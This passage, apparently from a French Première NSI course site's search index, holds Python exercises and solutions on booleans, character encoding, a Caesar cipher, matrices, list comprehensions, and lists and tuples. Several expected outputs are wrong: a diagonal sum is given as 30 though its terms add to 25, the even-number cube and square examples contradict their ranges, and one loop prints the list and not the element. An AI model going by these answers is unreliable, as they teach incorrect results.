condition.</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_bool/#exercice-3-utiliser-les-operateurs-logiques","title":"\ud83c\udfaf Exercice 3 : Utiliser les op\u00e9rateurs logiques \u2b50\u2b50","text":"<p>Pour chaque expression, \u00e9crire le r\u00e9sultat (<code>True</code> ou <code>False</code>).</p> <ol> <li><code>(5 &gt; 3) and (2 == 2)</code> \u2794 <code>______</code></li> <li><code>(4 &lt; 1) or (6 != 5)</code> \u2794 <code>______</code></li> <li><code>not (10 == 10)</code> \u2794 <code>______</code></li> <li><code>(7 &lt;= 7) and (8 &gt; 9)</code> \u2794 <code>______</code></li> <li><code>not ((3 != 3) or (5 &lt; 2))</code> \u2794 <code>______</code></li> </ol> Exercice 4 - Expressions bool\u00e9ennes complexes \u2b50\u2b50\u2b50  **\u00c9valuer les expressions suivantes \u00e9tape par \u00e9tape :**  1. `(3 &lt; 5) and (not (2 == 3)) or (4 &gt;= 4)` 2. `not ((10 &gt; 5) and (7 != 7)) or (3 &lt;= 3)` 3. `(True and False) or (not False and True)` 4. `((5 &gt; 3) or (2 &lt; 1)) and (not (4 == 4))`  \ud83d\udca1 Voir les solutions Solutions : 1. `True and True or True` = `True` 2. `not (True and False) or True` = `True` 3. `False or True` = `True` 4. `True and False` = `False`  Exercice 5 - Fonctions avec bool\u00e9ens \u2b50\u2b50\u2b50  **\u00c9crire des fonctions Python qui retournent un bool\u00e9en :**  1. `est_pair(n)` : retourne `True` si n est pair 2. `est_dans_intervalle(x, a, b)` : retourne `True` si x est entre a et b (inclus) 3. `est_voyelle(lettre)` : retourne `True` si la lettre est une voyelle 4. `est_triangle_rectangle(a, b, c)` : retourne `True` si les c\u00f4t\u00e9s forment un triangle rectangle  \ud83d\udca1 Voir les solutions  def est_pair(n): \u00a0\u00a0\u00a0\u00a0return n % 2 == 0 def est_dans_intervalle(x, a, b): \u00a0\u00a0\u00a0\u00a0return a &lt;= x &lt;= b def est_voyelle(lettre): \u00a0\u00a0\u00a0\u00a0return lettre.lower() in 'aeiou' def est_triangle_rectangle(a, b, c): \u00a0\u00a0\u00a0\u00a0return a**2 + b**2 == c**2 or a**2 + c**2 == b**2 or b**2 + c**2 == a**2  Exercice 6 - Applications pratiques \u2b50\u2b50\u2b50  **R\u00e9soudre les probl\u00e8mes suivants avec des expressions bool\u00e9ennes :**  1. Un \u00e9tudiant r\u00e9ussit son examen s'il a au moins 10/20 ET qu'il n'a pas eu 0 \u00e0 l'oral. \u00c9crire l'expression. 2. Un nombre est divisible par 6 s'il est divisible par 2 ET par 3. \u00c9crire la fonction `divisible_par_6(n)`. 3. Une ann\u00e9e est bissextile si elle est divisible par 4, SAUF si elle est divisible par 100, SAUF si elle est divisible par 400. \u00c9crire la fonction `est_bissextile(annee)`.  \ud83d\udca1 Voir les solutions 1. `(note &gt;= 10) and (oral != 0)` 2.  def divisible_par_6(n): \u00a0\u00a0\u00a0\u00a0return (n % 2 == 0) and (n % 3 == 0)  3.  def est_bissextile(annee): \u00a0\u00a0\u00a0\u00a0return (annee % 4 == 0) and ((annee % 100 != 0) or (annee % 400 == 0))"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercices_Caracteres/","title":"Fiche d'exercices : Encodage des caract\u00e8res","text":""},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercices_Caracteres/#encodage-en-table-ascii","title":"Encodage en table ASCII","text":"<p>D\u00e9coder les messages suivants en hexad\u00e9cimal \u00e0 l'aide de la table ASCII</p> <ol> <li><code>48 65 6C 6C 6F</code></li> <li><code>57 6F 72 6C 64</code></li> <li><code>31 32 33 34 35</code></li> </ol> <p>Encoder les messages suivants \u00e0 l'aide de la table ASCII </p> <ol> <li><code>Hello</code> </li> <li><code>123</code> </li> <li><code>!@#</code> </li> <li><code>Code</code> </li> </ol> <p>Python permet d'encoder des messages \u00e0 l'aide de divers encodages. Il existe la m\u00e9thode <code>encode</code> des cha\u00eenes de caract\u00e8res. Elle s'utilise de cette mani\u00e8re chaine_de_caractere.encode('M\u00e9thode d'encodage'). </p> <ol> <li>Instancier la cha\u00eene de caract\u00e8re : La vitesse de la lumi\u00e8re est de 300 000km/s.  </li> <li>Que se passe-t-il si l'on veut afficher l'encodage en ASCII de cette cha\u00eene de caract\u00e8re? Comment l'expliquer?  </li> </ol> <p>La m\u00e9thode <code>decode</code> de Python permet de donner le caract\u00e8re associ\u00e9 \u00e0 un point de code donn\u00e9. Cela s'utilise de cette mani\u00e8re : chaine_de_caractere.decode('M\u00e9thode de d\u00e9codage'). Donner les caract\u00e8res associ\u00e9s \u00e0 ces points de code :       1. b'\\x41'       2. b'\\xce\\xa9'       3. b'\\xe3\\x81\\x93'</p> Exercice 4 - Conversion binaire vers ASCII \u2b50\u2b50  **Convertir les s\u00e9quences binaires suivantes en caract\u00e8res ASCII :**  1. `01001000 01100101 01101100 01101100 01101111` 2. `01010000 01111001 01110100 01101000 01101111 01101110` 3. `00110001 00110010 00110011 00110100 00110101`  \ud83d\udca1 Voir les solutions Solutions : 1. H-e-l-l-o \u2192 \"Hello\" 2. P-y-t-h-o-n \u2192 \"Python\" 3. 1-2-3-4-5 \u2192 \"12345\"  Exercice 5 - Encodage UTF-8 \u2b50\u2b50\u2b50  **Comprendre l'encodage UTF-8 :**  1. Expliquer pourquoi le caract\u00e8re '\u00e9' n\u00e9cessite 2 octets en UTF-8 2. Encoder le mot \"caf\u00e9\" en UTF-8 (donner les octets en hexad\u00e9cimal) 3. D\u00e9coder la s\u00e9quence UTF-8 : `C3 A9 74 C3 A9` 4. Combien d'octets sont n\u00e9cessaires pour encoder \"\ud83d\udc0d\" (emoji serpent) ?  \ud83d\udca1 Voir les solutions 1. Le '\u00e9' a un point de code U+00E9 (233 en d\u00e9cimal), qui d\u00e9passe 127, donc n\u00e9cessite l'encodage multi-octets UTF-8. 2. \"caf\u00e9\" \u2192 63 61 66 C3 A9 3. \"\u00e9t\u00e9\" 4. 4 octets (F0 9F 90 8D)  Exercice 6 - Programmation avec encodages \u2b50\u2b50\u2b50  **\u00c9crire des fonctions Python :**  1. `ascii_vers_binaire(texte)` : convertit un texte ASCII en binaire 2. `binaire_vers_ascii(binaire)` : convertit du binaire en texte ASCII 3. `compter_octets_utf8(texte)` : compte le nombre d'octets n\u00e9cessaires en UTF-8 4. `est_ascii_pur(texte)` : v\u00e9rifie si un texte ne contient que des caract\u00e8res ASCII  \ud83d\udca1 Voir les solutions  def ascii_vers_binaire(texte): \u00a0\u00a0\u00a0\u00a0return ' '.join(format(ord(c), '08b') for c in texte) def binaire_vers_ascii(binaire): \u00a0\u00a0\u00a0\u00a0octets = binaire.split() \u00a0\u00a0\u00a0\u00a0return ''.join(chr(int(b, 2)) for b in octets) def compter_octets_utf8(texte): \u00a0\u00a0\u00a0\u00a0return len(texte.encode('utf-8')) def est_ascii_pur(texte): \u00a0\u00a0\u00a0\u00a0return all(ord(c) &lt; 128 for c in texte)  Exercice 7 - Chiffrement C\u00e9sar \u2b50\u2b50\u2b50  **Impl\u00e9menter le chiffrement C\u00e9sar avec les codes ASCII :**  1. \u00c9crire `chiffrer_cesar(texte, decalage)` qui d\u00e9cale chaque lettre 2. \u00c9crire `dechiffrer_cesar(texte_chiffre, decalage)` pour d\u00e9chiffrer 3. Tester avec le message \"HELLO\" et un d\u00e9calage de 3 4. Que devient \"PYTHON\" avec un d\u00e9calage de 13 ?  \ud83d\udca1 Voir les solutions  def chiffrer_cesar(texte, decalage): \u00a0\u00a0\u00a0\u00a0resultat = \"\" \u00a0\u00a0\u00a0\u00a0for c in texte: \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if c.isalpha(): \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0base = ord('A') if c.isupper() else ord('a') \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0resultat += chr((ord(c) - base + decalage) % 26 + base) \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else: \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0resultat += c \u00a0\u00a0\u00a0\u00a0return resultat def dechiffrer_cesar(texte_chiffre, decalage): \u00a0\u00a0\u00a0\u00a0return chiffrer_cesar(texte_chiffre, -decalage)  3. \"HELLO\" \u2192 \"KHOOR\" 4. \"PYTHON\" \u2192 \"CLGUBA\"  \ud83d\udccb Rappel - Table ASCII (extrait) : 32=' ' 33='!' 48='0' 49='1' 65='A' 66='B' 97='a' 98='b' 34='\"' 35='#' 50='2' 51='3' 67='C' 68='D' 99='c' 100='d' ..."},{"location":"premiere/III-Structures_de_donnees_lineaires/Cours/Cours/","title":"Cours","text":"\ud83d\udcda Structures de donn\u00e9es lin\u00e9aires <p>Ma\u00eetrisez les listes et tuples en Python pour organiser vos donn\u00e9es efficacement</p> \ud83c\udfaf D\u00e9finition Fondamentale \ud83d\udcd6 Structure de donn\u00e9es lin\u00e9aire              Une structure de donn\u00e9es lin\u00e9aire est une collection d'\u00e9l\u00e9ments stock\u00e9s s\u00e9quentiellement. En Python, les deux principales impl\u00e9mentations de tableaux sont les listes (mutables) et les tuples (immuables).          \ud83d\udccb Organisation s\u00e9quentielle                  Les \u00e9l\u00e9ments sont stock\u00e9s dans un ordre sp\u00e9cifique, chaque \u00e9l\u00e9ment ayant une position unique (indice).              \ud83d\udd22 Acc\u00e8s par indice                  Chaque \u00e9l\u00e9ment est accessible via son indice, permettant un acc\u00e8s direct et rapide aux donn\u00e9es.              \ud83d\udcbe Stockage efficace                  \u00c9vite la cr\u00e9ation de variables distinctes pour chaque \u00e9l\u00e9ment, optimisant l'utilisation de la m\u00e9moire.                       \u26a0\ufe0f Important : En Python, comme dans la plupart des langages, les indices commencent \u00e0 0.      \ud83c\udd9a Tuples vs Listes \ud83d\udd12 Tuples (Immuables) Syntaxe : <code>()</code> Caract\u00e9ristique : Non modifiables apr\u00e8s cr\u00e9ation Usage : Donn\u00e9es fixes, coordonn\u00e9es, configurations              \ud83d\udcbb Cr\u00e9ation d'un tuple <pre><code># Tuple vide\nmon_tuple_vide = ()\n\n# Tuple avec valeurs\nmon_tuple = (312, 354, 1234)\ncoordonnees = (10.5, 20.3)</code></pre> \ud83d\udd13 Listes (Mutables) Syntaxe : <code>[]</code> Caract\u00e9ristique : Modifiables apr\u00e8s cr\u00e9ation Usage : Collections dynamiques, donn\u00e9es \u00e9volutives              \ud83d\udcbb Cr\u00e9ation d'une liste <pre><code># Liste vide\nma_liste_vide = []\n\n# Liste avec valeurs\nma_liste = [312, 354, 1234]\nnotes = [14, 15, 20, 19]</code></pre> \ud83d\udcca Exemple de tableau d'indices Indice \u00c9l\u00e9ment Type 0 312 Premier \u00e9l\u00e9ment 1 354 Deuxi\u00e8me \u00e9l\u00e9ment 2 1234 Troisi\u00e8me \u00e9l\u00e9ment          \ud83d\udca1 Conseil : Privil\u00e9giez des tableaux contenant des donn\u00e9es de m\u00eame type pour \u00e9viter les erreurs et am\u00e9liorer la lisibilit\u00e9.      \ud83d\udd0d Acc\u00e8s et Manipulation \ud83d\udccf Taille d'un tableau              La fonction <code>len()</code> permet d'obtenir la longueur d'un tableau, identique au fonctionnement avec les cha\u00eenes de caract\u00e8res.          \ud83d\udcbb Obtenir la taille <pre><code>tableau_animaux = (\"chien\", \"chat\", \"oiseau\", \"poisson\")\nprint(len(tableau_animaux))  # Affiche: 4</code></pre> \ud83c\udfaf Acc\u00e8s par indice              Utilisez la syntaxe <code>tableau[indice]</code> pour acc\u00e9der \u00e0 un \u00e9l\u00e9ment sp\u00e9cifique.          \ud83d\udcbb Acc\u00e8s direct <pre><code>animaux = [\"chien\", \"chat\", \"poisson\", \"vache\"]\nprint(animaux[0])  # \"chien\"\nprint(animaux[3])  # \"vache\"</code></pre> \ud83d\udd04 Parcours avec boucles              Utilisez les boucles <code>for</code> et <code>while</code> pour parcourir tous les \u00e9l\u00e9ments.          \ud83d\udcbb Parcours complet <pre><code># Avec for et range\nfor i in range(len(tableau)):\n    print(tableau[i])\n\n# Avec for et in\nfor element in tableau:\n    print(element)</code></pre> \ud83d\udd17 Concat\u00e9nation              L'op\u00e9rateur <code>+</code> permet de fusionner plusieurs tableaux.          \ud83d\udcbb Fusion de tableaux <pre><code>tableau_1 = (1, 2, 3)\ntableau_2 = (4, 5, 6)\ntableau_3 = tableau_1 + tableau_2\n# R\u00e9sultat: (1, 2, 3, 4, 5, 6)</code></pre> \ud83d\udcdd Manipulation des Listes \ud83d\udd27 Avantages des listes mutables              Les listes permettent d'ajouter, supprimer et modifier des \u00e9l\u00e9ments apr\u00e8s leur cr\u00e9ation, offrant une flexibilit\u00e9 essentielle pour les donn\u00e9es dynamiques.          \u2795 Ajout d'\u00e9l\u00e9ments \ud83d\udcce M\u00e9thode append()                      Ajoute un \u00e9l\u00e9ment \u00e0 la fin de la liste. Modifie la liste en place.                  \ud83d\udcbb Utilisation d'append <pre><code>multiples_de_2 = []\nfor i in range(0, 11):\n    multiples_de_2.append(i * 2)\n# R\u00e9sultat: [0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20]</code></pre> \ud83d\udd17 Concat\u00e9nation                      Utilise l'op\u00e9rateur <code>+</code> mais cr\u00e9e une nouvelle liste \u00e0 chaque op\u00e9ration.                  \ud83d\udcbb Concat\u00e9nation (moins efficace) <pre><code>multiples_de_2 = []\nfor i in range(0, 11):\n    multiples_de_2 = multiples_de_2 + [i * 2]\n# Moins efficace car cr\u00e9e une nouvelle liste</code></pre> \u2796 Suppression d'\u00e9l\u00e9ments \ud83c\udfaf M\u00e9thode pop() <code>pop(i)</code> : retire l'\u00e9l\u00e9ment \u00e0 l'indice i <code>pop()</code> : retire le dernier \u00e9l\u00e9ment                  \ud83d\udcbb Utilisation de pop <pre><code>tableau = [1, 2, 3, 4]\nprint(tableau.pop(1))  # Affiche: 2\nprint(tableau.pop())   # Affiche: 4\nprint(tableau)         # Affiche: [1, 3]</code></pre> \ud83d\udd0d M\u00e9thode remove()                      Retire la premi\u00e8re occurrence de l'\u00e9l\u00e9ment sp\u00e9cifi\u00e9.                  \ud83d\udcbb Utilisation de remove <pre><code>tableau = [1, 2, 2, 3, 4, 4]\ntableau.remove(2)\nprint(tableau)  # Affiche: [1, 2, 3, 4, 4]</code></pre> \ud83d\ude80 Techniques Avanc\u00e9es \ud83d\udcdd Compr\u00e9hension de liste              Technique permettant de cr\u00e9er des listes de mani\u00e8re concise et \u00e9l\u00e9gante, en une seule ligne de code.          \ud83d\udcbb Syntaxe de base <pre><code># Syntaxe g\u00e9n\u00e9rale\n# [expression for element in iterable]\n# [expression for element in iterable if condition]\n\n# Exemple: multiples de 3\nmultiples_de_3 = [i * 3 for i in range(0, 11)]\n# R\u00e9sultat: [0, 3, 6, 9, 12, 15, 18, 21, 24, 27, 30]\n\n# Avec condition: nombres pairs\npairs = [i for i in range(20) if i % 2 == 0]\n# R\u00e9sultat: [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]</code></pre> \u26a1 Avantages                      \u2022 Code plus concis et lisible                     \u2022 Performance optimis\u00e9e                     \u2022 Syntaxe proche des math\u00e9matiques                  \ud83c\udfaf Structure                      \u2022 Expression : ce qui sera dans la liste                     \u2022 It\u00e9rable : source des donn\u00e9es                     \u2022 Condition : filtre optionnel                           \ud83d\udca1 Conseil : La compr\u00e9hension de liste est id\u00e9ale pour les transformations simples. Pour des logiques complexes, pr\u00e9f\u00e9rez les boucles traditionnelles pour maintenir la lisibilit\u00e9."},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/","title":"III - Fiche d'exercices : Listes avanc\u00e9es","text":""},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/#matrices","title":"Matrices","text":""},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/#facile","title":"Facile","text":"<ol> <li>On dispose de la matrice [[1,2,3],[4,5,6],[7,8,9]].</li> <li>Donner la position (indice de la ligne et de la colonne) de la valeur 2.</li> <li>Donner la valeur \u00e0 la ligne 1 et colonne 2.</li> <li> <p>Comment en python retrouver la valeur cherch\u00e9e en question 2.</p> </li> <li> <p>On dispose de la matrice [[1,2,3],[4,5,6],[7,8,9]]. </p> </li> <li>\u00c9crire un programme qui permet de donner la somme de tous les nombres de cette matrice.</li> <li>Tester avec d'autres matrices plus grandes.</li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/#moyenne","title":"Moyenne","text":"<ol> <li> <p>\u00c9crire une fonction <code>sous_matrice</code> qui prend en param\u00e8tre une matrice et deux indices (ligne et colonne), et renvoie une sous-matrice 2x2 commen\u00e7ant \u00e0 cette position. Exemple : <code>sous_matrice([[1, 2, 3], [4, 5, 6], [7, 8, 9]], 1, 1)</code>, cela doit renvoyer <code>[[5, 6], [8, 9]]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>valeurs_uniques_matrice</code> qui prend en param\u00e8tre une matrice et renvoie une liste des valeurs uniques pr\u00e9sentes dans la matrice. Exemple : <code>valeurs_uniques_matrice([[1, 2, 2], [3, 4, 4], [5, 1, 3]])</code>, cela doit renvoyer <code>[1, 2, 3, 4, 5]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>somme_diagonales</code> qui prend une matrice carr\u00e9e et renvoie la somme des \u00e9l\u00e9ments de ses deux diagonales. Exemple : <code>somme_diagonales([[1, 2, 3], [4, 5, 6], [7, 8, 9]])</code>, cela doit renvoyer <code>30</code> (1 + 5 + 9 + 3 + 7).</p> </li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/#difficile","title":"Difficile","text":"<ol> <li> <p>\u00c9crire une fonction <code>transpose_matrice</code> qui prend en param\u00e8tre une matrice et renvoie sa transpos\u00e9e. Exemple : <code>transpose_matrice([[1, 2, 3], [4, 5, 6]])</code>, cela doit renvoyer <code>[[1, 4], [2, 5], [3, 6]]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>produit_matrices</code> qui prend deux matrices et renvoie leur produit (en supposant qu'elles sont conformes). Exemple : <code>produit_matrices([[1, 2], [3, 4]], [[5, 6], [7, 8]])</code>, cela doit renvoyer <code>[[19, 22], [43, 50]]</code>.</p> </li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/#listes-par-comprehension","title":"Listes par compr\u00e9hension","text":""},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/#facile_1","title":"Facile","text":"<ol> <li>On dispose de la compr\u00e9hension suivante [i for i in range(10)].</li> <li>Quelle liste est cr\u00e9\u00e9e par cette compr\u00e9hension?</li> <li> <p>Modifier cette compr\u00e9hension pour donner le carr\u00e9 de chaque nombre.</p> </li> <li> <p>On peut rajouter des conditions dans des compr\u00e9hensions pour \u00e9viter certaines valeurs.</p> </li> <li>Quelle liste est cr\u00e9\u00e9e par la compr\u00e9hension suivante : [i for i in range(20) if i %2 == 0] ?</li> <li>Modifier cette compr\u00e9hension pour quelle fasse l'inverse.</li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/#moyenne_1","title":"Moyenne","text":"<ol> <li> <p>\u00c9crire une fonction <code>double_liste</code> qui prend une liste d'entiers en param\u00e8tre et utilise une compr\u00e9hension de liste pour renvoyer une nouvelle liste contenant le double de chaque \u00e9l\u00e9ment. Exemple : <code>double_liste([1, 2, 3, 4])</code>, cela doit renvoyer <code>[2, 4, 6, 8]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>enlever_negatifs</code> qui prend une liste de nombres et renvoie une nouvelle liste sans les nombres n\u00e9gatifs, en utilisant une compr\u00e9hension de liste. Exemple : <code>enlever_negatifs([-3, 0, 5, -1, 7])</code>, cela doit renvoyer <code>[0, 5, 7]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>longueur_liste</code> qui prend une liste de cha\u00eenes et renvoie une liste des longueurs de chaque cha\u00eene, en utilisant une compr\u00e9hension de liste. Exemple : <code>longueur_liste([\"chat\", \"chien\", \"poisson\"])</code>, cela doit renvoyer <code>[4, 5, 7]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>cubes_pairs</code> qui g\u00e9n\u00e8re une liste des cubes des nombres pairs de 1 \u00e0 10 \u00e0 l'aide d'une compr\u00e9hension de liste. Exemple : <code>cubes_pairs()</code>, cela doit renvoyer <code>[0, 8, 64]</code>.</p> </li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercice_supplementaire/#difficile_1","title":"Difficile","text":"<ol> <li> <p>\u00c9crire une fonction <code>nombres_multiples_3</code> qui cr\u00e9e une liste des nombres multiples de 3 de 0 \u00e0 30 \u00e0 l'aide d'une compr\u00e9hension de liste. Exemple : <code>nombres_multiples_3()</code>, cela doit renvoyer <code>[0, 3, 6, 9, 12, 15, 18, 21, 24, 27, 30]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>squares_pairs</code> qui cr\u00e9e une liste des carr\u00e9s des nombres pairs de 1 \u00e0 20 en utilisant une compr\u00e9hension de liste. Exemple : <code>squares_pairs()</code>, cela doit renvoyer <code>[0, 4, 16, 36, 64, 100, 144, 196]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>pairs_ou_impairs</code> qui prend une liste d'entiers et renvoie une liste de cha\u00eenes indiquant si chaque nombre est pair ou impair. Exemple : <code>pairs_ou_impairs([1, 2, 3, 4])</code>, cela doit renvoyer <code>[\"impair\", \"pair\", \"impair\", \"pair\"]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>inverser_cha\u00eenes</code> qui prend une liste de cha\u00eenes de caract\u00e8res et renvoie une nouvelle liste contenant ces cha\u00eenes invers\u00e9es. Exemple : <code>inverser_cha\u00eenes([\"abc\", \"def\", \"ghi\"])</code>, cela doit renvoyer <code>[\"cba\", \"fed\", \"ihg\"]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>fusionner_sans_doublons</code> qui prend en param\u00e8tres deux listes et renvoie une nouvelle liste contenant tous les \u00e9l\u00e9ments des deux listes sans doublons. Exemple : <code>fusionner_sans_doublons([1, 2, 3], [3, 4, 5])</code>, cela doit renvoyer <code>[1, 2, 3, 4, 5]</code>.</p> </li> <li> <p>\u00c9crire une fonction <code>prefixes</code> qui prend une liste de mots et renvoie une liste contenant tous les pr\u00e9fixes possibles pour chaque mot. Exemple : <code>prefixes([\"chat\", \"chien\"])</code>, cela doit renvoyer <code>[\"\", \"c\", \"ch\", \"cha\", \"chat\", \"\", \"c\", \"ch\", \"chi\", \"chien\"]</code>.</p> </li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercices_papier/","title":"I - Fiche d'exercices : Listes et tuples sur papier","text":""},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercices_papier/#exercice-1-creation-et-manipulation-de-tuples","title":"Exercice 1 : Cr\u00e9ation et manipulation de tuples","text":"<ol> <li> <p>Cr\u00e9er un tuple nomm\u00e9 <code>mon_tuple</code> contenant les \u00e9l\u00e9ments suivants : <code>\"pomme\"</code>, <code>\"banane\"</code>, <code>\"cerise\"</code>.  </p> </li> <li> <p>Afficher l'\u00e9l\u00e9ment \u00e0 l'indice 1 du tuple.</p> </li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercices_papier/#exercice-2-creation-et-manipulation-de-listes","title":"Exercice 2 : Cr\u00e9ation et manipulation de listes","text":"<ol> <li> <p>Cr\u00e9er une liste nomm\u00e9e <code>ma_liste</code> avec les \u00e9l\u00e9ments suivants : <code>\"chien\"</code>, <code>\"chat\"</code>, <code>\"lapin\"</code>.</p> </li> <li> <p>Afficher l'\u00e9l\u00e9ment \u00e0 l'indice 2 de la liste.</p> </li> <li> <p>Remplacer l'\u00e9l\u00e9ment <code>\"lapin\"</code> par <code>\"hamster\"</code>. Afficher la liste mise \u00e0 jour.</p> </li> <li> <p>Ajouter l'\u00e9l\u00e9ment <code>\"oiseau\"</code> \u00e0 la fin de la liste. Afficher la liste.</p> </li> <li> <p>Ajouter les \u00e9l\u00e9ments <code>\"poisson\"</code>, <code>\"tortue\"</code> \u00e0 la liste en une seule op\u00e9ration (indice : concat\u00e9nation).</p> </li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercices_papier/#exercice-3-index-et-manipulation-avancee","title":"Exercice 3 : Index et manipulation avanc\u00e9e","text":"<ol> <li> <p>Cr\u00e9er une liste de nombres <code>3, 8, 12, 5, 10</code>.</p> </li> <li> <p>Afficher le premier et le dernier \u00e9l\u00e9ment de la liste en utilisant les indices.</p> </li> <li> <p>Utiliser une boucle pour afficher tous les \u00e9l\u00e9ments de la liste avec leur indice correspondant.</p> </li> <li> <p>Ajouter le nombre <code>15</code> \u00e0 la fin de la liste, puis afficher la liste.</p> </li> <li> <p>Ins\u00e9rer le nombre <code>7</code> \u00e0 l'indice 1. Afficher la nouvelle liste.</p> </li> <li> <p>Supprimer l'\u00e9l\u00e9ment \u00e0 l'indice 3. Afficher la liste mise \u00e0 jour.  </p> </li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercices_papier/#exercice-4-concatenation-et-repetition","title":"Exercice 4 : Concat\u00e9nation et r\u00e9p\u00e9tition","text":"<ol> <li> <p>Cr\u00e9er deux listes : <code>liste_A = [\"rouge\", \"bleu\", \"vert\"]</code> et <code>liste_B = [\"jaune\", \"noir\"]</code>.</p> </li> <li> <p>Concat\u00e9ner les deux listes pour obtenir une nouvelle liste appel\u00e9e <code>liste_C</code>. L'afficher.</p> </li> <li> <p>Multiplier la liste <code>liste_A</code> par 2 pour obtenir une liste r\u00e9p\u00e9t\u00e9e deux fois. Afficher le r\u00e9sultat.</p> </li> </ol>"},{"location":"premiere/III-Structures_de_donnees_lineaires/Fiche_d_exercices/Fiche_exercices_tuples_listes/","title":"\ud83d\udce6 II - Fiche d'exercice : Les tuples et les listes","text":"<p>\u26a0\ufe0f Attention</p> <p>Tous les exercices, s'ils sont r\u00e9alis\u00e9s par des boucles <code>for</code>, doivent \u00eatre faits avec une boucle sur les indices et une boucle sur les valeurs.   <pre><code>   l = [1,2,3,4]\n   # for par valeur:\n   for elt in l:\n      print(l)\n\n   # for par indice (utilisation de len() qui permet d'avoir la taille d'une s\u00e9quence):\n   for i in range(len(l)):\n      print(l[i])\n</code></pre></p> \ud83c\udfaf Exercices d'introduction \ud83c\udf1f Niveau Facile \ud83d\udd25 Niveau Interm\u00e9diaire \ud83d\ude80 Niveau Difficile \ud83e\udd8a Algorithmes Importants Introduction \ud83e\udd8a Exercice 1 - Cr\u00e9ation de structures Cr\u00e9er un tuple nomm\u00e9 <code>mon_tuple</code> qui contient les \u00e9l\u00e9ments 1,2,3,4,5 et une liste <code>ma_liste</code> qui contient les \u00e9l\u00e9ments suivants 'a','b','c','d','e'. Les afficher dans le terminal. \u2192 Voir la correction              <pre><code>mon_tuple = (1,2,3,4,5)\nma_liste = ['a','b','c','d','e']\nprint(mon_tuple)\nprint(ma_liste)</code></pre> Introduction \ud83e\udd8a Exercice 2 - Acc\u00e8s aux \u00e9l\u00e9ments Afficher dans le terminal le troisi\u00e8me \u00e9l\u00e9ment de <code>mon_tuple</code> et le premier \u00e9l\u00e9ment de <code>ma_liste</code>. \u2192 Voir la correction          <pre><code>print(mon_tuple[2])  # Troisi\u00e8me \u00e9l\u00e9ment (index 2)\nprint(ma_liste[0])   # Premier \u00e9l\u00e9ment (index 0)</code></pre> Introduction \ud83e\udd8a Exercice 3 - Modification d'\u00e9l\u00e9ments Modifier le deuxi\u00e8me \u00e9l\u00e9ment de <code>ma_liste</code> par 'z'.             V\u00e9rifier la modification en affichant la liste dans le terminal. \u2192 Voir la correction          <pre><code>ma_liste[1] = 'z'  # Modification du deuxi\u00e8me \u00e9l\u00e9ment\nprint(ma_liste)     # V\u00e9rification</code></pre> Introduction \ud83e\udd8a Exercice 4 - Ajout et suppression Ajouter l'\u00e9l\u00e9ment 'f' dans <code>ma_liste</code>.             Supprimer le premier \u00e9l\u00e9ment de <code>ma_liste</code>.             V\u00e9rifier les modifications en affichant la liste dans le terminal. \u2192 Voir la correction          <pre><code>ma_liste.append('f')  # Ajout de 'f'\nma_liste.pop(0)       # Suppression du premier \u00e9l\u00e9ment\nprint(ma_liste)       # V\u00e9rification</code></pre> Introduction \ud83e\udd8a Exercice 5 - Parcours avec boucles Afficher dans le terminal tous les \u00e9l\u00e9ments de <code>mon_tuple</code> et <code>ma_liste</code> un \u00e0 un \u00e0 l'aide d'une boucle <code>for</code>. \u2192 Voir la correction          <pre><code># Parcours par valeur\nfor elt in mon_tuple:\n    print(elt)\n\nfor elt in ma_liste:\n    print(elt)\n\n# Parcours par indice\nfor i in range(len(mon_tuple)):\n    print(mon_tuple[i])\n\nfor i in range(len(ma_liste)):\n    print(ma_liste[i])</code></pre> Introduction \ud83e\udd8a\ud83e\udd8a Exercice 6 - Exercice complet Cr\u00e9er une liste <code>nombres</code> qui contient les chiffres allant de 1 \u00e0 9. (Proposer une version par compr\u00e9hension).             Afficher dans le terminal les 5 premiers \u00e9l\u00e9ments de la liste en utilisant une boucle 